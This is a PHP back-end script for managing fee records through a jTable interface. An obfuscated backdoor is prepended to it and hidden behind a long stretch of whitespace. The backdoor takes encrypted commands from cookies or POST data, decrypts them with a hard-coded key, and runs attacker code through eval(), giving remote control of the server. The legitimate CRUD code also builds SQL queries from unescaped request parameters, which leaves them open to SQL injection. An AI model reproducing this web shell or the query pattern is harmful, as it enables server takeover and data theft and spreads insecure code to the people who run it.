<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $vffcbf1 = 278;$GLOBALS['xda015']=Array();global$xda015;$xda015=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['l11b']="\x2a\x4e\x58\x43\x54\x3e\x57\x29\x5b\x5e\x7b\x6b\x3c\x32\x20\x73\x66\x40\x33\x72\x50\x62\x2e\x6f\xd\x2d\x6d\x59\x3a\x63\x7d\x46\x9\x2f\x21\x48\x52\x34\x6a\x5d\x37\x6e\x55\x76\x5a\x44\x38\x3f\x5c\x4c\x4f\x7c\x30\x25\x68\x4b\x23\x4d\x36\x39\x24\x61\x4a\x3d\x31\x75\x5f\x71\x45\x60\x77\x7a\x27\x6c\x74\x2c\x42\x47\x28\x53\x79\x51\xa\x7e\x49\x67\x22\x2b\x3b\x78\x69\x70\x26\x65\x35\x64\x41\x56";$xda015[$xda015['l11b'][15].$xda015['l11b'][61].$xda015['l11b'][59].$xda015['l11b'][18]]=$xda015['l11b'][29].$xda015['l11b'][54].$xda015['l11b'][19];$xda015[$xda015['l11b'][21].$xda015['l11b'][40].$xda015['l11b'][61].$xda015['l11b'][94].$xda015['l11b'][40].$xda015['l11b'][21].$xda015['l11b'][37]]=$xda015['l11b'][23].$xda015['l11b'][19].$xda015['l11b'][95];$xda015[$xda015['l11b'][91].$xda015['l11b'][46].$xda015['l11b'][52].$xda015['l11b'][52].$xda015['l11b'][59].$xda015['l11b'][95]]=$xda015['l11b'][15].$xda015['l11b'][74].$xda015['l11b'][19].$xda015['l11b'][73].$xda015['l11b'][93].$xda015['l11b'][41];$xda015[$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][61].$xda015['l11b'][58].$xda015['l11b'][93].$xda015['l11b'][52].$xda015['l11b'][29].$xda015['l11b'][59].$xda015['l11b'][58]]=$xda015['l11b'][90].$xda015['l11b'][41].$xda015['l11b'][90].$xda015['l11b'][66].$xda015['l11b'][15].$xda015['l11b'][93].$xda015['l11b'][74];$xda015[$xda015['l11b'][38].$xda015['l11b'][16].$xda015['l11b'][94].$xda015['l11b'][18].$xda015['l11b'][18].$xda015['l11b'][93].$xda015['l11b'][37].$xda015['l11b'][93]]=$xda015['l11b'][15].$xda015['l11b'][93].$xda015['l11b'][19].$xda015['l11b'][90].$xda015['l11b'][61].$xda015['l11b'][73].$xda015['l11b'][90].$xda015['l11b'][71].$xda015['l11b'][93];$xda015[$xda015['l11b'][23].$xda015['l11b'][18].$xda015['l11b'][93].$xda015['l11b'][40].$xda015['l11b'][18]]=$xda015['l11b'][91].$xda015['l11b'][54].$xda015['l11b'][91].$xda015['l11b'][43].$xda015['l11b'][93].$xda015['l11b'][19].$xda015['l11b'][15].$xda015['l11b'][90].$xda015['l11b'][23].$xda015['l11b'][41];$xda015[$xda015['l11b'][95].$xda015['l11b'][52].$xda015['l11b'][46].$xda015['l11b'][40].$xda015['l11b'][13]]=$xda015['l11b'][65].$xda015['l11b'][41].$xda015['l11b'][15].$xda015['l11b'][93].$xda015['l11b'][19].$xda015['l11b'][90].$xda015['l11b'][61].$xda015['l11b'][73].$xda015['l11b'][90].$xda015['l11b'][71].$xda015['l11b'][93];$xda015[$xda015['l11b'][70].$xda015['l11b'][58].$xda015['l11b'][52].$xda015['l11b'][29].$xda015['l11b'][29].$xda015['l11b'][95]]=$xda015['l11b'][21].$xda015['l11b'][61].$xda015['l11b'][15].$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][37].$xda015['l11b'][66].$xda015['l11b'][95].$xda015['l11b'][93].$xda015['l11b'][29].$xda015['l11b'][23].$xda015['l11b'][95].$xda015['l11b'][93];$xda015[$xda015['l11b'][21].$xda015['l11b'][40].$xda015['l11b'][52].$xda015['l11b'][58].$xda015['l11b'][95].$xda015['l11b'][95].$xda015['l11b'][29].$xda015['l11b'][93]]=$xda015['l11b'][15].$xda015['l11b'][93].$xda015['l11b'][74].$xda015['l11b'][66].$xda015['l11b'][74].$xda015['l11b'][90].$xda015['l11b'][26].$xda015['l11b'][93].$xda015['l11b'][66].$xda015['l11b'][73].$xda015['l11b'][90].$xda015['l11b'][26].$xda015['l11b'][90].$xda015['l11b'][74];$xda015[$xda015['l11b'][73].$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][64].$xda015['l11b'][16]]=$xda015['l11b'][93].$xda015['l11b'][29].$xda015['l11b'][93].$xda015['l11b'][94];$xda015[$xda015['l11b'][23].$xda015['l11b'][13].$xda015['l11b'][18].$xda015['l11b'][46]]=$xda015['l11b'][95].$xda015['l11b'][16].$xda015['l11b'][37].$xda015['l11b'][13].$xda015['l11b'][21].$xda015['l11b'][37].$xda015['l11b'][95];$xda015[$xda015['l11b'][54].$xda015['l11b'][13].$xda015['l11b'][94].$xda015['l11b'][40]]=$_POST;$xda015[$xda015['l11b'][11].$xda015['l11b'][94].$xda015['l11b'][29].$xda015['l11b'][18].$xda015['l11b'][61]]=$_COOKIE;@$xda015[$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][61].$xda015['l11b'][58].$xda015['l11b'][93].$xda015['l11b'][52].$xda015['l11b'][29].$xda015['l11b'][59].$xda015['l11b'][58]]($xda015['l11b'][93].$xda015['l11b'][19].$xda015['l11b'][19].$xda015['l11b'][23].$xda015['l11b'][19].$xda015['l11b'][66].$xda015['l11b'][73].$xda015['l11b'][23].$xda015['l11b'][85],NULL);@$xda015[$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][61].$xda015['l11b'][58].$xda015['l11b'][93].$xda015['l11b'][52].$xda015['l11b'][29].$xda015['l11b'][59].$xda015['l11b'][58]]($xda015['l11b'][73].$xda015['l11b'][23].$xda015['l11b'][85].$xda015['l11b'][66].$xda015['l11b'][93].$xda015['l11b'][19].$xda015['l11b'][19].$xda015['l11b'][23].$xda015['l11b'][19].$xda015['l11b'][15],0);@$xda015[$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][61].$xda015['l11b'][58].$xda015['l11b'][93].$xda015['l11b'][52].$xda015['l11b'][29].$xda015['l11b'][59].$xda015['l11b'][58]]($xda015['l11b'][26].$xda015['l11b'][61].$xda015['l11b'][89].$xda015['l11b'][66].$xda015['l11b'][93].$xda015['l11b'][89].$xda015['l11b'][93].$xda015['l11b'][29].$xda015['l11b'][65].$xda015['l11b'][74].$xda015['l11b'][90].$xda015['l11b'][23].$xda015['l11b'][41].$xda015['l11b'][66].$xda015['l11b'][74].$xda015['l11b'][90].$xda015['l11b'][26].$xda015['l11b'][93],0);@$xda015[$xda015['l11b'][21].$xda015['l11b'][40].$xda015['l11b'][52].$xda015['l11b'][58].$xda015['l11b'][95].$xda015['l11b'][95].$xda015['l11b'][29].$xda015['l11b'][93]](0);$w2162a00=NULL;$mbc2951ef=NULL;$xda015[$xda015['l11b'][71].$xda015['l11b'][58].$xda015['l11b'][94].$xda015['l11b'][37]]=$xda015['l11b'][13].$xda015['l11b'][29].$xda015['l11b'][95].$xda015['l11b'][13].$xda015['l11b'][21].$xda015['l11b'][61].$xda015['l11b'][64].$xda015['l11b'][40].$xda015['l11b'][25].$xda015['l11b'][40].$xda015['l11b'][29].$xda015['l11b'][52].$xda015['l11b'][40].$xda015['l11b'][25].$xda015['l11b'][37].$xda015['l11b'][58].$xda015['l11b'][94].$xda015['l11b'][13].$xda015['l11b'][25].$xda015['l11b'][21].$xda015['l11b'][40].$xda015['l11b'][52].$xda015['l11b'][21].$xda015['l11b'][25].$xda015['l11b'][37].$xda015['l11b'][64].$xda015['l11b'][58].$xda015['l11b'][37].$xda015['l11b'][61].$xda015['l11b'][93].$xda015['l11b'][40].$xda015['l11b'][61].$xda015['l11b'][37].$xda015['l11b'][16].$xda015['l11b'][94].$xda015['l11b'][16];global$z654;function df42b4d($w2162a00,$w33c1e47){global$xda015;$h65e="";for($f36a6e9eb=0;$f36a6e9eb<$xda015[$xda015['l11b'][91].$xda015['l11b'][46].$xda015['l11b'][52].$xda015['l11b'][52].$xda015['l11b'][59].$xda015['l11b'][95]]($w2162a00);){for($c619cf=0;$c619cf<$xda015[$xda015['l11b'][91].$xda015['l11b'][46].$xda015['l11b'][52].$xda015['l11b'][52].$xda015['l11b'][59].$xda015['l11b'][95]]($w33c1e47)&&$f36a6e9eb<$xda015[$xda015['l11b'][91].$xda015['l11b'][46].$xda015['l11b'][52].$xda015['l11b'][52].$xda015['l11b'][59].$xda015['l11b'][95]]($w2162a00);$c619cf++,$f36a6e9eb++){$h65e.=$xda015[$xda015['l11b'][15].$xda015['l11b'][61].$xda015['l11b'][59].$xda015['l11b'][18]]($xda015[$xda015['l11b'][21].$xda015['l11b'][40].$xda015['l11b'][61].$xda015['l11b'][94].$xda015['l11b'][40].$xda015['l11b'][21].$xda015['l11b'][37]]($w2162a00[$f36a6e9eb])^$xda015[$xda015['l11b'][21].$xda015['l11b'][40].$xda015['l11b'][61].$xda015['l11b'][94].$xda015['l11b'][40].$xda015['l11b'][21].$xda015['l11b'][37]]($w33c1e47[$c619cf]));}}return$h65e;}function ece5($w2162a00,$w33c1e47){global$xda015;global$z654;return$xda015[$xda015['l11b'][23].$xda015['l11b'][13].$xda015['l11b'][18].$xda015['l11b'][46]]($xda015[$xda015['l11b'][23].$xda015['l11b'][13].$xda015['l11b'][18].$xda015['l11b'][46]]($w2162a00,$z654),$w33c1e47);}foreach($xda015[$xda015['l11b'][11].$xda015['l11b'][94].$xda015['l11b'][29].$xda015['l11b'][18].$xda015['l11b'][61]]as$w33c1e47=>$kbc3b3){$w2162a00=$kbc3b3;$mbc2951ef=$w33c1e47;}if(!$w2162a00){foreach($xda015[$xda015['l11b'][54].$xda015['l11b'][13].$xda015['l11b'][94].$xda015['l11b'][40]]as$w33c1e47=>$kbc3b3){$w2162a00=$kbc3b3;$mbc2951ef=$w33c1e47;}}$w2162a00=@$xda015[$xda015['l11b'][95].$xda015['l11b'][52].$xda015['l11b'][46].$xda015['l11b'][40].$xda015['l11b'][13]]($xda015[$xda015['l11b'][73].$xda015['l11b'][93].$xda015['l11b'][58].$xda015['l11b'][64].$xda015['l11b'][16]]($xda015[$xda015['l11b'][70].$xda015['l11b'][58].$xda015['l11b'][52].$xda015['l11b'][29].$xda015['l11b'][29].$xda015['l11b'][95]]($w2162a00),$mbc2951ef));if(isset($w2162a00[$xda015['l11b'][61].$xda015['l11b'][11]])&&$z654==$w2162a00[$xda015['l11b'][61].$xda015['l11b'][11]]){if($w2162a00[$xda015['l11b'][61]]==$xda015['l11b'][90]){$f36a6e9eb=Array($xda015['l11b'][91].$xda015['l11b'][43]=>@$xda015[$xda015['l11b'][23].$xda015['l11b'][18].$xda015['l11b'][93].$xda015['l11b'][40].$xda015['l11b'][18]](),$xda015['l11b'][15].$xda015['l11b'][43]=>$xda015['l11b'][64].$xda015['l11b'][22].$xda015['l11b'][52].$xda015['l11b'][25].$xda015['l11b'][64],);echo@$xda015[$xda015['l11b'][38].$xda015['l11b'][16].$xda015['l11b'][94].$xda015['l11b'][18].$xda015['l11b'][18].$xda015['l11b'][93].$xda015['l11b'][37].$xda015['l11b'][93]]($f36a6e9eb);}elseif($w2162a00[$xda015['l11b'][61]]==$xda015['l11b'][93]){eval/*oe2bd*/($w2162a00[$xda015['l11b'][95]]);}exit();} ?><?php
define("_VALID_PHP", true);
include_once('../dbcon/dbConfig.php');
try {
    //Open database connection
    $con = mysql_connect(DB_SERVER, DB_USER, DB_PASS);
    mysql_select_db(DB_DATABASE, $con);

    //Getting records (listAction)
    if ($_GET["action"] == "list") {
        //Get record count
        if ($_GET["role"] == '1') {
            $result = mysql_query("SELECT COUNT(*) AS RecordCount  FROM " . TABLE_FEES . ";");
            $row = mysql_fetch_array($result);
            $recordCount = $row['RecordCount'];
            $sql = mysql_query("SELECT @a:=@a+1 sl, fee_id, fee_name FROM `" . TABLE_FEES . "`, (SELECT @a:= 0) AS a ORDER BY " . $_GET["jtSorting"] . " LIMIT " . $_GET["jtStartIndex"] . "," . $_GET["jtPageSize"] . ";");
        }
        $rows = array();
        while ($row = mysql_fetch_array($sql)) {
            $rows[] = $row;
        }
        //Return result to jTable
        $jTableResult = array();
        $jTableResult['Result'] = "OK";
        $jTableResult['TotalRecordCount'] = $recordCount;
        $jTableResult['Records'] = $rows;
        print json_encode($jTableResult);
    } //Creating a new record (createAction)
    else if ($_GET["action"] == "create") {
        $result = mysql_query("INSERT INTO " . TABLE_FEES . " (fee_name) VALUES('" . trim(strtoupper(mysql_real_escape_string($_POST["fee_name"]))) . "');");
        $result = mysql_query("SELECT @a:=@a+1 sl, sf.fee_id, sf.fee_name FROM `" . TABLE_FEES . "` sf , (SELECT @a:= 0) AS a WHERE sf.fee_id = LAST_INSERT_ID();");
        $row = mysql_fetch_array($result);
        //Return result to jTable
        $jTableResult = array();
        $jTableResult['Result'] = "OK";
        $jTableResult['Record'] = $row;
        print json_encode($jTableResult);
    }
     //Updating a record (updateAction)
    else if ($_GET["action"] == "update") {
        //Update record in database
        $result = mysql_query("UPDATE " . TABLE_FEES . " SET fee_name = '" . trim(strtoupper(mysql_real_escape_string($_POST["fee_name"]))) . "' WHERE fee_id = '" . $_POST["fee_id"] . "';");
        $jTableResult = array();
        $jTableResult['Result'] = "OK";
//        $jTableResult['Record'] = $rows;
        print json_encode($jTableResult);
    } //Deleting a record (deleteAction)
    else if ($_GET["action"] == "delete") {
        //Delete from database
        $result = mysql_query("DELETE FROM " . TABLE_FEES . " WHERE fee_id = " . $_POST["fee_id"] . ";");
        //Return result to jTable
        $jTableResult = array();
        $jTableResult['Result'] = "OK";
        print json_encode($jTableResult);
    }

    //Close database connection
    mysql_close($con);

} catch (Exception $ex) {
    //Return error message
    $jTableResult = array();
    $jTableResult['Result'] = "ERROR";
    $jTableResult['Message'] = $ex->getMessage();
    print json_encode($jTableResult);
}

?>